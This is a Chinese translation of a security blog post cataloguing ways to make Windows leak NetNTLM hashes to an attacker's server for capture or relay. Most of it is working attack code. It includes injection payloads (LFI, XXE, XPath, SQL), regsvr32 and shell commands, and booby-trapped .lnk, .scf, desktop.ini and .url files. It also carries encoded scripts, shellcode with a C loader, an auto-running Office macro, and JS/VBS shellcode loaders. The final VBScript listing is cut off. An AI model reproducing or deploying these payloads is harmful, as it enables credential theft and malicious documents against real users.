> 原文链接: https://www.anquanke.com//post/id/85791 


# 【技术分享】窃取NTLM HASH的多种奇妙方法


                                阅读量   
                                **153176**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：osandamalith.com
                                <br>原文地址：[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p0.ssl.qhimg.com/t01ae098bab6d941ee9.png)](https://p0.ssl.qhimg.com/t01ae098bab6d941ee9.png)**

****

翻译：[pwn_361](http://bobao.360.cn/member/contribute?uid=2798962642)

稿费：140RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

当我们想使用Responder工具窃取Windows的NTLM HASH时，经常会有一个疑问，用什么办法才能让Windows系统发送NTLM HASH值呢？经过一些实验后，我发现办法有很多，现在，我乐意将我发现的一些很酷的东西分享给大家，所以写了这篇文章。需要说明的是，在我们下面的攻击场景中，你不仅可以使用Responder偷取到NTLM HASH值，还可以直接使用SMBRelay攻击方法。

<br>

**本地文件包含(LFI)**

在PHP中，利用include()函数可以实现解析网络路径的目的(在这里，大家自己想一下，为什么需要触发网络路径解析，触发网络路径解析后，为什么responder工具就有可能会抓取到NTLM HASH值呢？)。利用方法如下图：

```
http://host.tld/?page=//11.22.33.44/@OsandaMalith
```

下图是实验结果：

[![](https://p5.ssl.qhimg.com/t01c55a8c4ac2ee3766.png)](https://p5.ssl.qhimg.com/t01c55a8c4ac2ee3766.png)

<br>

**XML外部实体注入(XXE)**

在这里，我使用了“php://filter/convert.base64-encode/resource=”脚本，该脚本能解析网络路径。



```
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=//11.22.33.44/@OsandaMalith" &gt;
]&gt;
&lt;root&gt;
  &lt;name&gt;&lt;/name&gt;
  &lt;tel&gt;&lt;/tel&gt;
  &lt;email&gt;OUT&amp;xxe;OUT&lt;/email&gt;
  &lt;password&gt;&lt;/password&gt;
&lt;/root&gt;
```

下图是实验结果：

[![](https://p4.ssl.qhimg.com/t0139fdd47046dad715.png)](https://p4.ssl.qhimg.com/t0139fdd47046dad715.png)

<br>

**XPath注入(XPath Injection)**

通常，在out-of-band(OOB) XPath注入攻击中，doc()函数可用于解析网络路径。利用方法如下：

```
http://host.tld/?title=Foundation&amp;type=*&amp;rent_days=* and doc('//35.164.153.224/@OsandaMalith')
```

下图是实验结果：

[![](https://p4.ssl.qhimg.com/t013083681d4df264b9.png)](https://p4.ssl.qhimg.com/t013083681d4df264b9.png)

<br>

**MySql注入**

在MySql out-of-band注入中，我写了一篇完整的[帖子](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/)，大家可以看一下，可用到互联网中。你也可以使用“INTO OUTFILE”去解析一个网络路径。利用方法如下：

```
http://host.tld/index.php?id=1’ union select 1,2,load_file(‘\\192.168.0.100\@OsandaMalith’),4;%00
```

下图是实验结果：

[![](https://p5.ssl.qhimg.com/t01087c7c9e6548488b.png)](https://p5.ssl.qhimg.com/t01087c7c9e6548488b.png)

<br>

**Regsvr32**

偶然的一个机会，我发现Regsvr32竟然也能实现我们的目的，利用方法如下：

```
regsvr32 /s /u /i://35.164.153.224/@OsandaMalith scrobj.dll
```

下图是实验结果：

[![](https://p2.ssl.qhimg.com/t01d7bcb1a7547ec9cf.png)](https://p2.ssl.qhimg.com/t01d7bcb1a7547ec9cf.png)

<br>

**批处理文件**

利用批处理文件时，你有很多方法可以去实现目的：



```
echo 1 &gt; //192.168.0.1/abc
pushd \192.168.0.1abc
cmd /k \192.168.0.1abc
cmd /c \192.168.0.1abc
start \192.168.0.1abc
mkdir \192.168.0.1abc
type\192.168.0.1abc
dir\192.168.0.1abc
find, findstr, [x]copy, move, replace, del, rename and many more!
```

下图是实验结果：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016e33985339f5b859.png)

<br>

**Windows自动完成(Auto-Complete)**

你只需要在合适的位置输入“\host”，就可以自动完成，输入位置如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010d6ebe0a23481516.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01509d46ccb8b2a379.png)

<br>

**Autorun.inf**

需要说明的是，这种方法只适用于Windows 7以下系统，因为在Windows 7以上系统中，这个功能被取消了。不过，你可以通过修改自动运行的组策略，重新启用这个功能。在实际运用时，最好确保Autorun.inf文件是隐藏的，方法如下：



```
[autorun]
open=\35.164.153.224setup.exe
icon=something.ico
action=open Setup.exe
```



**SHELL命令文件**

你可以将它存储为“.scf”文件，一旦打开文件夹资源管理器，它将会尝试解析图标的网络路径。



```
[Shell]
Command=2
IconFile=\35.164.153.224test.ico
[Taskbar]
Command=ToggleDesktop
```



**Desktop.ini**

Desktop.ini文件中包含了你要应用到文件夹的图标信息。我们可以将它用于解析一个网络路径。一旦你打开这个文件夹，它就会自动解析网络路径，就可以得到HASH，利用方法如下：



```
mkdir openMe
attrib +s openMe
cd openMe
echo [.ShellClassInfo] &gt; desktop.ini
echo IconResource=\192.168.0.1aa &gt;&gt; desktop.ini
attrib +s +h desktop.ini
```

需要注意的是，在XP系统中，Desktop.ini文件使用“IcondFile”代替了“IconResource”。



```
[.ShellClassInfo]
IconFile=\192.168.0.1aa
IconIndex=1337
```



**快捷方式文件(.lnk)**

我们可以创建一个包含网络路径的快捷方式文件，当你打开打时，Windows就会尝试解析网络路径。你还可以指定快捷键以触发快捷方式。对于图标位置，你可以使用一个Windows二进制文件、或位于system32目录中的shell32.dll、Ieframe.dll、imageres.dll、pnidui.dll、wmploc.dll等。



```
Set shl = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
currentFolder = shl.CurrentDirectory
Set sc = shl.CreateShortcut(fso.BuildPath(currentFolder, "StealMyHashes.lnk"))
sc.TargetPath = "\35.164.153.224@OsandaMalith"
sc.WindowStyle = 1
sc.HotKey = "Ctrl+Alt+O"
sc.IconLocation = "%windir%system32shell32.dll, 3"
sc.Description = "I will Steal your Hashes"
sc.Save
```

下面是对应的Powershell版：



```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("StealMyHashes.lnk")
$lnk.TargetPath = "\35.164.153.224@OsandaMalith"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%system32shell32.dll, 3"
$lnk.Description = "I will Steal your Hashes"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0166c0eded23d84861.png)

<br>

**Internet快捷方式(.url)**

另一个可以利用的快捷方式是Internet快捷方式，你可以将下面的代码存储为“.url”文件：



```
echo [InternetShortcut] &gt; stealMyHashes.url 
echo URL=file://192.168.0.1/@OsandaMalith &gt;&gt; stealMyHashes.url
```



**<br>**

**注册表自动运行**

可以在下列路径中添加一个新的注册表项：



```
HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRun
HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRun
HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunOnce
HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRunOnce
```

需要添加的内容如下：

[![](https://p0.ssl.qhimg.com/t01eb58c00929efd476.png)](https://p0.ssl.qhimg.com/t01eb58c00929efd476.png)

<br>

**Powershell**

在Powershell中，存在很多可以解析网络路径的小脚本，部分利用方法如下：



```
Invoke-Item \192.168.0.1aa
Get-Content \192.168.0.1aa
Start-Process \192.168.0.1aa
```



**IE**

IE可以解析UNC路径，利用方法如下：

```
&lt;img src="\\192.168.0.1\aa"&gt;
```

你也可以将它注入到XSS中，或你发现的SQL注入场景中，例如：

```
http://host.tld/?id=-1' union select 1,'&lt;img src="\\192.168.0.1\aa"&gt;';%00
```



**VBScript**

你可以将下面的代码存储为“.vbs”文件，或者内嵌到Word/Excel文件的宏里面：



```
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
```

你也可以将它应用到WEB网页中，不过这种方法只适用于IE：



```
S&lt;html&gt;
&lt;script type="text/Vbscript"&gt;
&lt;!--
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
//--&gt;
&lt;/script&gt;
&lt;/html&gt;
```

下面是编码过的版本，你可以将它进行编码，并存储为“.vbe”文件：

```
#@~^ZQAAAA==jY~6?`}`'ZM2mO2`}`4%+1YcEUmDb2YbxocorV?H/O+h6(LnmDE#=?nO,sksn`{`0dWcGa+U:+XYsbVcJJzf*cF*cF*2  yczmCE~8#XSAAAA==^#~@
```

也可以在HTML文件中应用它。不过还是只适用于IE。你需要将它存储为“.hta”文件，利用方法如下：



```
&lt;html&gt;
&lt;script type="text/Vbscript.Encode"&gt;
&lt;!--
#@~^ZQAAAA==jY~6?`}`'ZM2mO2`}`4%+1YcEUmDb2YbxocorV?H/O+h6(LnmDE#=?nO,sksn`{`0dWcGa+U:+XYsbVcJJzf*cF*cF*2  yczmCE~8#XSAAAA==^#~@
//--&gt;
&lt;/script&gt;
&lt;/html&gt;
```



**JScript**

利用这种方法时，需要将下面的代码存储为Windows的“js”文件:



```
var fso = new ActiveXObject("Scripting.FileSystemObject")
fso.FileExists("//192.168.0.103/aa")
```

同样，也可以应用于“.hta”文件中，不过还是只适用于IE：



```
&lt;html&gt;
&lt;script type="text/Jscript"&gt;
&lt;!--
var fso = new ActiveXObject("Scripting.FileSystemObject")
fso.FileExists("//192.168.0.103/aa")
//--&gt;
&lt;/script&gt;
&lt;/html&gt;
```

编码版，需要存储为“.jse”文件：

```
#@~^XAAAAA==-mD~6/K'xh,)mDk-+or8%mYvE?1DkaOrxTRwks+jzkYn:`}`8LmOE*i0dGcsrV3XkdD/vJzJFO+R8v0RZRqT2zlmE#Ux4AAA==^#~@
```

HTML版本：



```
&lt;html&gt;
&lt;script type="text/Jscript.Encode"&gt;
&lt;!--
#@~^XAAAAA==-mD~6/K'xh,)mDk-+or8%mYvE?1DkaOrxTRwks+jzkYn:`}`8LmOE*i0dGcsrV3XkdD/vJzJFO+R8v0RZRqT2zlmE#Ux4AAA==^#~@
//--&gt;
&lt;/script&gt;
&lt;/html&gt;
```



**Windows脚本文件**

将下面的代码存储为“.wsf”文件：



```
&lt;package&gt;
  &lt;job id="boom"&gt;
    &lt;script language="VBScript"&gt;
       Set fso = CreateObject("Scripting.FileSystemObject")
       Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
    &lt;/script&gt;
   &lt;/job&gt;
&lt;/package&gt;
```



**Shellcode**

下面的[Shellcode](https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html)使用了CreateFile函数，并尝试读取一个不存在的网络路径。你可以使用类似Responder的工具抓取NTLM HASH值。通过修改Shellcode，攻击者甚至可以直接偷取网络中传输的其他HASH。也可以执行SMBRelay攻击。代码如下：



```
/*
    Title: CreateFile Shellcode
    Author: Osanda Malith Jayathissa (@OsandaMalith)
    Website: https://osandamalith.com
    Size: 368 Bytes
*/
# include &lt;stdlib.h&gt;
# include &lt;stdio.h&gt;
# include &lt;string.h&gt;
# include &lt;windows.h&gt;
int main() `{`
  char *shellcode = 
  "xe8xffxffxffxffxc0x5fxb9x4cx03x02x02x81xf1x02x02"
  "x02x02x83xc7x1dx33xf6xfcx8ax07x3cx05x0fx44xc6xaa"
  "xe2xf6xe8x05x05x05x05x5ex8bxfex81xc6x29x01x05x05"
  "xb9x02x05x05x05xfcxadx01x3cx07xe2xfax56xb9x8dx10"
  "xb7xf8xe8x5fx05x05x05x68x31x01x05x05xffxd0xb9xe0"
  "x53x31x4bxe8x4ex05x05x05xb9xacxd5xaax88x8bxf0xe8"
  "x42x05x05x05x6ax05x68x80x05x05x05x6ax03x6ax05x6a"
  "x01x68x05x05x05x80x68x3ex01x05x05xffxd0x6ax05xff"
  "xd6x33xc0x5exc3x33xd2xebx10xc1xcax0dx3cx61x0fxbe"
  "xc0x7cx03x83xe8x20x03xd0x41x8ax01x84xc0x75xeax8b"
  "xc2xc3x8dx41xf8xc3x55x8bxecx83xecx14x53x56x57x89"
  "x4dxf4x64xa1x30x05x05x05x89x45xfcx8bx45xfcx8bx40"
  "x0cx8bx40x14x89x45xecx8bxf8x8bxcfxe8xd2xffxffxff"
  "x8bx70x18x8bx3fx85xf6x74x4fx8bx46x3cx8bx5cx30x78"
  "x85xdbx74x44x8bx4cx33x0cx03xcexe8x96xffxffxffx8b"
  "x4cx33x20x89x45xf8x33xc0x03xcex89x4dxf0x89x45xfc"
  "x39x44x33x18x76x22x8bx0cx81x03xcexe8x75xffxffxff"
  "x03x45xf8x39x45xf4x74x1cx8bx45xfcx8bx4dxf0x40x89"
  "x45xfcx3bx44x33x18x72xdex3bx7dxecx75x9cx33xc0x5f"
  "x5ex5bxc9xc3x8bx4dxfcx8bx44x33x24x8dx04x48x0fxb7"
  "x0cx30x8bx44x33x1cx8dx04x88x8bx04x30x03xc6xebxdf"
  "x21x05x05x05x50x05x05x05x6bx65x72x6ex65x6cx33x32"
  "x2ex64x6cx6cx05x2fx2fx65x72x72x6fx72x2fx61x61x05";
  DWORD oldProtect;
  wprintf(L"Length : %d bytesn@OsandaMalith", strlen(shellcode));
  BOOL ret = VirtualProtect (shellcode, strlen(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);
  if (!ret) `{`
      fprintf(stderr, "%s", "Error Occured");
      return EXIT_FAILURE;
  `}`
  ((void(*)(void))shellcode)();
  VirtualProtect (shellcode, strlen(shellcode), oldProtect, &amp;oldProtect);
  return EXIT_SUCCESS;
`}`
```

[https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html](https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html)

[![](https://p2.ssl.qhimg.com/t0187045f48bd917533.png)](https://p2.ssl.qhimg.com/t0187045f48bd917533.png)

<br>

**将Shellcode嵌入到宏里**

在这里，我们将上面的Shellcode嵌入到Word/Excel宏里面。你可以使用同样的代码嵌入到一个VB6应用程序中：



```
' Author : Osanda Malith Jayathissa (@OsandaMalith)
' Title: Shellcode to request a non-existing network path
' Website: https://osandamalith
' Shellcode : https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
' This is a word/excel macro. This can be used in vb6 applications as well
#If Vba7 Then
    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As Long, _
        ByVal dwStackSize As Long, _ 
        ByVal lpStartAddress As LongPtr, _
        lpParameter As Long, _
        ByVal dwCreationFlags As Long, _ 
        lpThreadId As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As Long, _
        ByVal dwSize As Long, _
        ByVal flAllocationType As Long, _
        ByVal flProtect As Long) As LongPtr 
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination  As LongPtr, _
        ByRef Source As Any, _
        ByVal Length As Long) As LongPtr
#Else
    Private Declare Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As Long, _
        ByVal dwStackSize As Long, _
        ByVal lpStartAddress As Long, _
        lpParameter As Long, _
        ByVal dwCreationFlags As Long, _
        lpThreadId As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As Long, _
        ByVal dwSize As Long, _
        ByVal flAllocationType As Long, _
        ByVal flProtect As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As Long, _
        ByRef Source As Any, _
        ByVal Length As Long) As Long
#EndIf
Const MEM_COMMIT = &amp;H1000
Const PAGE_EXECUTE_READWRITE = &amp;H40
Sub Auto_Open()
    Dim source As Long, i As Long
#If Vba7 Then
    Dim  lpMemory As LongPtr, lResult As LongPtr
#Else
    Dim  lpMemory As Long, lResult As Long
#EndIf
    Dim bShellcode(376) As Byte
        bShellcode(0) = 232
        bShellcode(1) = 255
        bShellcode(2) = 255
        bShellcode(3) = 255
        bShellcode(4) = 255
        bShellcode(5) = 192
        bShellcode(6) = 95
        bShellcode(7) = 185
        bShellcode(8) = 85
        bShellcode(9) = 3
        bShellcode(10) = 2
        bShellcode(11) = 2
        bShellcode(12) = 129
        bShellcode(13) = 241
        bShellcode(14) = 2
        bShellcode(15) = 2
        bShellcode(16) = 2
                .....................
lpMemory = VirtualAlloc(0, UBound(bShellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    For i = LBound(bShellcode) To UBound(bShellcode)
        source = bShellcode(i)
        lResult = RtlMoveMemory(lpMemory + i, source, 1)
    Next i
    lResult = CreateThread(0, 0, lpMemory, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
```

[https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vba](https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vba) 

<br>

**将Shellcode嵌入到VBS和JS代码中**

subTee做了很多关于JS和DynamicWrapperX的研究。你可以找到一个[使用DynamicWrapperX DLL的POC](http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html)，根据他的研究，我将Shellcode嵌入到了JS和VBS中。有趣的是，我可以将Shellcode嵌入JScript或VBScript脚本中，再将这些脚本内嵌到HTML或“.hta”格式的文件中：

JScript：



```
/*
 * Author : Osanda Malith Jayathissa (@OsandaMalith)
 * Title: Shellcode to request a non-existing network path
 * Website: https://osandamalith
 * Shellcode : https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
 * Based on subTee's JS: https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04
 */
DX = new ActiveXObject("DynamicWrapperX"); 
DX.Register("kernel32.dll", "VirtualAlloc", "i=luuu", "r=u");
DX.Register("kernel32.dll","CreateThread","i=uullu","r=u" );
DX.Register("kernel32.dll", "WaitForSingleObject", "i=uu", "r=u");
var MEM_COMMIT = 0x1000;
var PAGE_EXECUTE_READWRITE = 0x40;
var sc = [
0xe8, 0xff, 0xff, 0xff, 0xff, 0xc0, 0x5f, 0xb9, 0x55, 0x03, 0x02, 0x02, 0x81, 0xf1, 0x02, 0x02, 0x02, 0x02, 0x83, 0xc7,
0x1d, 0x33, 0xf6, 0xfc, 0x8a, 0x07, 0x3c, 0x05, 0x0f, 0x44, 0xc6, 0xaa, 0xe2, 0xf6, 0xe8, 0x05, 0x05, 0x05, 0x05, 0x5e,
0x8b, 0xfe, 0x81, 0xc6, 0x29, 0x01, 0x05, 0x05, 0xb9, 0x02, 0x05, 0x05, 0x05, 0xfc, 0xad, 0x01, 0x3c, 0x07, 0xe2, 0xfa,
0x56, 0xb9, 0x8d, 0x10, 0xb7, 0xf8, 0xe8, 0x5f, 0x05, 0x05, 0x05, 0x68, 0x31, 0x01, 0x05, 0x05, 0xff, 0xd0, 0xb9, 0xe0,
0x53, 0x31, 0x4b, 0xe8, 0x4e, 0x05, 0x05, 0x05, 0xb9, 0xac, 0xd5, 0xaa, 0x88, 0x8b, 0xf0, 0xe8, 0x42, 0x05, 0x05, 0x05,
0x6a, 0x05, 0x68, 0x80, 0x05, 0x05, 0x05, 0x6a, 0x03, 0x6a, 0x05, 0x6a, 0x01, 0x68, 0x05, 0x05, 0x05, 0x80, 0x68, 0x3e,
0x01, 0x05, 0x05, 0xff, 0xd0, 0x6a, 0x05, 0xff, 0xd6, 0x33, 0xc0, 0x5e, 0xc3, 0x33, 0xd2, 0xeb, 0x10, 0xc1, 0xca, 0x0d,
0x3c, 0x61, 0x0f, 0xbe, 0xc0, 0x7c, 0x03, 0x83, 0xe8, 0x20, 0x03, 0xd0, 0x41, 0x8a, 0x01, 0x84, 0xc0, 0x75, 0xea, 0x8b,
0xc2, 0xc3, 0x8d, 0x41, 0xf8, 0xc3, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x14, 0x53, 0x56, 0x57, 0x89, 0x4d, 0xf4, 0x64, 0xa1,
0x30, 0x05, 0x05, 0x05, 0x89, 0x45, 0xfc, 0x8b, 0x45, 0xfc, 0x8b, 0x40, 0x0c, 0x8b, 0x40, 0x14, 0x89, 0x45, 0xec, 0x8b,
0xf8, 0x8b, 0xcf, 0xe8, 0xd2, 0xff, 0xff, 0xff, 0x8b, 0x70, 0x18, 0x8b, 0x3f, 0x85, 0xf6, 0x74, 0x4f, 0x8b, 0x46, 0x3c,
0x8b, 0x5c, 0x30, 0x78, 0x85, 0xdb, 0x74, 0x44, 0x8b, 0x4c, 0x33, 0x0c, 0x03, 0xce, 0xe8, 0x96, 0xff, 0xff, 0xff, 0x8b,
0x4c, 0x33, 0x20, 0x89, 0x45, 0xf8, 0x33, 0xc0, 0x03, 0xce, 0x89, 0x4d, 0xf0, 0x89, 0x45, 0xfc, 0x39, 0x44, 0x33, 0x18,
0x76, 0x22, 0x8b, 0x0c, 0x81, 0x03, 0xce, 0xe8, 0x75, 0xff, 0xff, 0xff, 0x03, 0x45, 0xf8, 0x39, 0x45, 0xf4, 0x74, 0x1c,
0x8b, 0x45, 0xfc, 0x8b, 0x4d, 0xf0, 0x40, 0x89, 0x45, 0xfc, 0x3b, 0x44, 0x33, 0x18, 0x72, 0xde, 0x3b, 0x7d, 0xec, 0x75,
0x9c, 0x33, 0xc0, 0x5f, 0x5e, 0x5b, 0xc9, 0xc3, 0x8b, 0x4d, 0xfc, 0x8b, 0x44, 0x33, 0x24, 0x8d, 0x04, 0x48, 0x0f, 0xb7,
0x0c, 0x30, 0x8b, 0x44, 0x33, 0x1c, 0x8d, 0x04, 0x88, 0x8b, 0x04, 0x30, 0x03, 0xc6, 0xeb, 0xdf, 0x21, 0x05, 0x05, 0x05,
0x50, 0x05, 0x05, 0x05, 0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x05, 0x2f, 0x2f, 0x33,
0x35, 0x2e, 0x31, 0x36, 0x34, 0x2e, 0x31, 0x35, 0x33, 0x2e, 0x32, 0x32, 0x34, 0x2f, 0x61, 0x61, 0x05];
var scLocation = DX.VirtualAlloc(0, sc.length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
for(var i = 0; i &lt; sc.length; i++) DX.NumPut(sc[i],scLocation,i);
var thread = DX.CreateThread(0,0,scLocation,0,0);
```

[https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.js](https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.js) 

VBScript：



```
' Author : Osanda Malith Jayathissa (@OsandaMalith)
' Title: Shellcode to request a non-existing network path
' Website: https://osandamalith
' Shellcode : https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
' Based on subTee's JS: https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04
Set DX = CreateObject("DynamicWrapperX")
DX.Register "kernel32.dll", "VirtualAlloc", "i=luuu", "r=u"
DX.Register "kernel32.dll","CreateThread","i=uullu","r=u" 
DX.Register "kernel32.dll", "WaitForSingleObject", "i=uu", "r=u" 
Const MEM_COMMIT = &amp;H1000
Const PAGE_EXECUTE_READWRITE = &amp;H40
shellcode = Array( _
&amp;He8, &amp;Hff, &amp;Hff, &amp;Hff, &amp;Hff, &amp;Hc0, &amp;H5f, &amp;Hb9, &amp;H55, &amp;H03, &amp;H02, &amp;H02, &amp;H81, &amp;Hf1, &amp;H02, &amp;H02, &amp;H02, &amp;H02, &amp;H83, &amp;Hc7, _
&amp;H1d, &amp;H33, &amp;Hf6, &amp;Hfc, &amp;H8a, &amp;H07, &amp;H3c, &amp;H05, &amp;H0f, &amp;H44, &amp;Hc6, &amp;Haa, &amp;He2, &amp;Hf6, &amp;He8, &amp;H05, &amp;H05, &amp;H05, &amp;H05, &amp;H5e, _
&amp;H8b, &amp;Hfe, &amp;H81, &amp;Hc6, &amp;H29, &amp;H01, &amp;H05, &amp;H05, &amp;Hb9, &amp;H02, &amp;H05, &amp;H05, &amp;H05, &amp;Hfc, &amp;Had, &amp;H01, &amp;H3c, &amp;H07, &amp;He2, &amp;Hfa, _
&amp;H56, &amp;Hb9, &amp;H8d, &amp;H10, &amp;Hb7, &amp;Hf8, &amp;He8, &amp;H5f, &amp;H05, &amp;H05, &amp;H05, &amp;H68, &amp;H31, &amp;H01, &amp;H05, &amp;H05, &amp;Hff, &amp;Hd0, &amp;Hb9, &amp;He0, _ 
&amp;H53, &amp;H31, &amp;H4b, &amp;He8, &amp;H4e, &amp;H05, &amp;H05, &amp;H05, &amp;Hb9, &amp;Hac, &amp;Hd5, &amp;Haa, &amp;H88, &amp;H8b, &amp;Hf0, &amp;He8, &amp;H42, &amp;H05, &amp;H05, &amp;H05, _
&amp;H6a, &amp;H05, &amp;H68, &amp;H80, &amp;H05, &amp;H05, &amp;H05, &amp;H6a, &amp;H03, &amp;H6a, &amp;H05, &amp;H6a, &amp;H01, &amp;H68, &amp;H05, &amp;H05, &amp;H05, &amp;H80, &amp;H68, &amp;H3e, _
&amp;H01, &amp;H05, &amp;H05, &amp;Hff, &amp;Hd0, &amp;H6a, &amp;H05, &amp;Hff, &amp;Hd6, &amp;H33, &amp;Hc0, &amp;H5e, &amp;Hc3, &amp;H33, &amp;Hd2, &amp;Heb, &amp;H10, &amp;Hc1, &amp;Hca, &amp;H0d, _
&amp;H3c, &amp;H61, &amp;H0f, &amp;Hbe, &amp;Hc0, &amp;H7c, &amp;H03, &amp;H83, &amp;He8, &amp;H20, &amp;H03, &amp;Hd0, &amp;H41, &amp;H8a, &amp;H01, &amp;H84, &amp;Hc0, &amp;H75, &amp;Hea, &amp;H8b, _
&amp;Hc2, &amp;Hc3, &amp;H8d, &amp;H41, &amp;Hf8, &amp;Hc3, &amp;H55, &amp;H8b, &amp;Hec, &amp;H83, &amp;Hec, &amp;H14, &amp;H53, &amp;H56, &amp;H57, &amp;H89, &amp;H4d, &amp;Hf4, &amp;H64, &amp;Ha1, _
&amp;H30, &amp;H05, &amp;H05, &amp;H05, &amp;H89, &amp;H45, &amp;Hfc, &amp;H8b, &amp;H45, &amp;Hfc, &amp;H8b, &amp;H40, &amp;H0c, &amp;H8b, &amp;H40, &amp;H14, &amp;H89, &amp;H45, &amp;Hec, &amp;H8b, _
&amp;Hf8, &amp;H8b, &amp;Hcf, &amp;He8, &amp;Hd2, &amp;Hff, &amp;Hff, &amp;Hff, &amp;H8b, &amp;H70, &amp;H18, &amp;H8b, &amp;H3f, &amp;H85, &amp;Hf6, &amp;H74, &amp;H4f, &amp;H8b, &amp;H46, &amp;H3c, _ 
&amp;H8b, &amp;H5c, &amp;H30, &amp;H78, &amp;H85, &amp;Hdb, &amp;H74, &amp;H44, &amp;H8b, &amp;H4c, &amp;H33, &amp;H0c, &amp;H03, &amp;Hce, &amp;He8, &amp;H96, &amp;Hff, &amp;Hff, &amp;Hff, &amp;H8b, _
&amp;H4c, &amp;H33, &amp;H20, &amp;H89, &amp;H45, &amp;Hf8, &amp;H33, &amp;Hc0, &amp;H03, &amp;Hce, &amp;H89, &amp;H4d, &amp;Hf0, &amp;H89, &amp;H45, &amp;Hfc, &amp;H39, &amp;H44, &amp;H33, &amp;H18, _
&amp;H76, &amp;H22, &amp;H8b, &amp;H0c, &amp;H81, &amp;H03, &amp;Hce, &amp;He8, &amp;H75, &amp;Hff, &amp;Hff, &amp;Hff, &amp;H03, &amp;H45, &amp;Hf8, &amp;H39, &amp;H45, &amp;Hf4, &amp;H74, &amp;H1c, _
&amp;H8b, &amp;H45, &amp;Hfc, &amp;H8b, &amp;H4d, &amp;Hf0, &amp;H40, &amp;H89, &amp;H45, &amp;Hfc, &amp;H3b, &amp;H44, &amp;H33, &amp;H18, &amp;H72, &amp;Hde, &amp;H3b, &amp;H7d, &amp;Hec, &amp;H75, _
